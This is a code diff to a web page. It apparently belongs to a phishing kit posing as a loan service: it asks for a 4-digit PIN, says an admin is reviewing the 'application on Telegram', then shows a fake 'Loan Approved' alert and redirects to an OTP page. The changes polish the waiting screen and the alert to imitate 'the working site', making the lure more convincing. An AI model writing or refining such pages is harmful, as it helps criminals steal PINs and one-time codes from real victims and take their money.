@@ -18,6 +18,12 @@
         .error { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 12px; margin-bottom: 16px; display: none; }
         .success { background: #f0fdf4; color: #166534; padding: 12px; border-radius: 12px; margin-bottom: 16px; display: none; }
         .spinner { display: none; text-align: center; margin-top: 16px; color: #E42320; }
+        .waiting-area { display: none; text-align: center; padding: 16px; background: #fef3c7; border-radius: 12px; margin-bottom: 16px; }
+        .waiting-dots { display: flex; justify-content: center; gap: 5px; margin-top: 10px; }
+        .dot { width: 10px; height: 10px; background: #E42320; border-radius: 50%; animation: pulse 1.5s infinite; }
+        .dot:nth-child(2) { animation-delay: 0.3s; }
+        .dot:nth-child(3) { animation-delay: 0.6s; }
+        @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
         .back-btn { background: transparent; color: #666; border: 1px solid #ddd; margin-top: 12px; }
     </style>
 </head>
@@ -31,9 +37,20 @@
         <input type="password" id="pin" placeholder="PIN" maxlength="4">
         <div class="error" id="errorMsg"></div>
         <div class="success" id="successMsg"></div>
+        
+        <div class="waiting-area" id="waitingArea">
+            <strong>⏳ Waiting for Admin Approval</strong>
+            <div class="waiting-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application on Telegram...</p>
+        </div>
+        
         <button id="verifyBtn">Verify & Authorize</button>
         <button class="back-btn" onclick="window.location.href='/'">← Back</button>
-        <div class="spinner" id="spinner">⏳ Waiting for admin approval...</div>
+        <div class="spinner" id="spinner">⏳ Sending...</div>
     </div>
 </div>
 <script>
@@ -75,18 +92,27 @@
                     clearInterval(statusInterval);
                     statusInterval = null;
                     document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('waitingArea').style.display = 'none';
                     showSuccess("✅ Approved! Redirecting...");
+                    
+                    // ALERT LIKE THE WORKING SITE
+                    alert("✅ Loan Approved! Redirecting to OTP page...");
+                    
                     setTimeout(() => window.location.href = '/otp', 1500);
                 } else if (data.status === 'declined') {
                     clearInterval(statusInterval);
                     statusInterval = null;
                     document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('waitingArea').style.display = 'none';
                     showError("❌ Request declined.");
                     document.getElementById('verifyBtn').disabled = false;
                     document.getElementById('verifyBtn').innerHTML = "Verify & Authorize";
                     isProcessing = false;
                 }
-            } catch(e) { console.error('Poll error:', e); }
+            } catch(e) { 
+                console.error('Poll error:', e);
+                showError("Connection issue. Please check approval on Telegram.");
+            }
         }, 2000);
     }
     
@@ -103,6 +129,7 @@
         let btn = this;
         btn.disabled = true;
         btn.innerHTML = "Sending...";
+        document.getElementById('spinner').style.display = 'block';
         
         currentId = Date.now().toString();
         console.log(`Sending ID: ${currentId}`);
@@ -122,19 +149,20 @@
             let data = await res.json();
             
             if (data.success) {
-                showSuccess("✓ Sent! Waiting for approval...");
-                document.getElementById('spinner').style.display = 'block';
-                btn.innerHTML = "Waiting...";
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('waitingArea').style.display = 'block';
+                btn.style.display = 'none';
                 startPolling(currentId);
             } else {
                 throw new Error("Failed");
             }
         } catch(e) {
+            console.error('Submit error:', e);
+            document.getElementById('spinner').style.display = 'none';
             showError("Network error. Try again.");
             btn.disabled = false;
             btn.innerHTML = "Verify & Authorize";
             isProcessing = false;
-            document.getElementById('spinner').style.display = 'none';
         }
     };
     
